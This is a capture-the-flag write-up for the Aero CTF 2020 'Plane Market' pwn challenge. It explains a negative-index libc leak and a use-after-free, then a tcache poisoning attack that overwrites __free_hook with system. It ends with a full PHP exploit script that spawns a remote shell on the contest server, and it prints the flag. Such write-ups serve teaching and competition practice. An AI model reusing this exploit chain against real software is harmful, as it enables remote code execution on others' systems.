# Plane Market - Aero CTF 2020 (pwn, 416p, 24 solved)
## Introduction

Plane Market is a pwn task.

An archive containing a binary, a libc and its corresponding loader (`ld.so`).

The binary simulates a plane market in which the user can put planes for sale.

## Reverse engineering

When a new plane is put for sale, the program looks for a empty spot in a global
array, and fills it with a `plane` structure:

```c
struct plane {
	char  *name;
	long   cost;
	time_t date;
	char  *comment;
	size_t nameSize;
	time_t delDate;
};
```

This array can contain up to 16 planes. The program properly checks that the
there is space to sell a new place.

It is possible to delete and check the information of a specific plane on the
market. Both functions check that the user-specified index is inferior to 16.
The deletion function frees the `name` and `comment` pointers.

Finally, it is possible to rename a plane for sale. The program uses the
`nameSize` field to determine how many bytes to read.

## Vulnerability

The binary contains two vulnerabilities : an information leak and a use-after
vulnerability.

While the functions that display and delete a plane check that the user input is
inferior to 16, it stores the user's index in a **signed** integer. It is
possible to read and delete planes with negative indexes.

The use-after-free is somewhat strange : for some reason, renaming a plane will
not check if the plane is deleted if it has been renamed before. (`id ==
last_plane_id`)

## Exploitation

The information leak can be exploited to leak the base address of the libc. By
looking at the information of plane with index -2, it is possible to leak
pointers to `_IO_2_1_stdin_` that lies in the `.bss` section.

```
{?} Enter plane id: -2
---- Plane [-2] ----
Name: (­û
Cost: 0
Time: 140737353910784
Comment: <Empty>
```

```
% grep libc.so /proc/$PID/maps
7ffff7e0f000-7ffff7e34000 [...] libc.so.6
```

`0x7ffff7e0f000 == 140737353910784 - 0x001b9a00`

The use-after-free is a how2heap-like textbook case of `tcache poisoning
attack`. The exploitation goes along these lines:
1. allocate a buffer small enough to fit in the `tcache` bin
2. free it
3. change the first 8 bytes to corrupt the `tcache` linked list
4. allocate twice to get `malloc` return the corrupted pointer
5. leverage arbitrary write primitive to get code execution

A classic way to achieve the last point is to overwrite libc's `__free_hook`
with a pointer to `system`, and call `system("/bin/sh")`.

**Flag**: `Aero{13f96a24f185f0862ea1ecd88c854b12d5a4b7ba85b43dc42e0bb2d187a2ef9b}`

## Appendices

### pwn.php
```php
#!/usr/bin/php
<?php
require_once("Socket.php");

function menu(Tube $t)
{
	$t->expectLine("-------- Plane market --------");
	$t->expectLine("1. Sell plane");
	$t->expectLine("2. Delete plane");
	$t->expectLine("3. View sales list");
	$t->expectLine("4. View plane");
	$t->expectLine("5. Change plane name");
	$t->expectLine("6. View profile");
	$t->expectLine("7. Exit");
	$t->expect("> ");
}

function sell(Tube $t, $name, $cost, $com = null, $size = null, $csize = null)
{
	if(null === $size)
		$size = strlen($name);

	menu($t);
	$t->write("1\n");

	$t->expect("{?} Enter name size: ");
	$t->write("$size\n");

	$t->expect("{?} Enter plane name: ");
	$t->write($name);

	$t->expect("{?} Enter plane cost: ");
	$t->write("$cost\n");

	$t->expect("{?} Do you wanna leave a comment? [Y\N]: ");
	if(null === $com) {
		$t->write("N\n");
	} else {
		if(null === $csize)
			$csize = strlen($com);

		$t->write("Y\n");

		$t->expect("{?} Enter comment size: ");
		$t->write("$csize\n");

		$t->expect("{?} Comment: ");
		$t->write($com);
	}
}

function del(Tube $t, $idx)
{
	menu($t);
	$t->write("2\n");

	$t->expect("{?} Enter plane id: ");
	$t->write("$idx\n");
}

function show(Tube $t, $idx)
{
	menu($t);
	$t->write("4\n");

	$t->expect("{?} Enter plane id: ");
	$t->write("$idx\n");

	$t->expectLine("---- Plane [$idx] ----");
	$t->expect("Name: ");    $name = $t->readLine(); 
	$t->expect("Cost: ");    $cost = $t->readLine();
	$t->expect("Time: ");    $time = $t->readLine();
	$t->expect("Comment: "); $comment = $t->readLine();

	if("<Empty>" === $comment)
		$comment = null;

	return [$name, $cost, $time, $comment];
}

function ren(Tube $t, $idx, $name)
{
	menu($t);
	$t->write("5\n");

	$t->expect("{?} Enter plane id: ");
	$t->write("$idx\n");
	$t->expect("{?} Enter new plane name: ");
	$t->write($name);
}

$t = new Socket("tasks.aeroctf.com", 33087);

$t->expect("{?} Enter name: ");
$t->write("[TFNS] XeR\n");

$leak = show($t, -2);
$libc = $leak[2] - 0x001b9a00; // _IO_2_1_stdin_
printf("[+] libc: %X\n", $libc);

printf("[*] Create and rename plane\n");
sell($t,    "asdfasdf", 1337);
ren($t, 0,  "asdfasdf");

printf("[*] Poison tcache\n");
del($t, 0);
ren($t, 0, pack("Q", $libc + 0x001bc5a8)); // __free_hook


printf("[*] Abuse tcache\n");
sell($t, "/bin/sh\0", 1337);
sell($t, pack("Q", $libc + 0x00046ff0), 1337); // system

printf("[*] Call system\n");
del($t, 0);

printf("[+] Pipe\n");
$t->pipe();
```
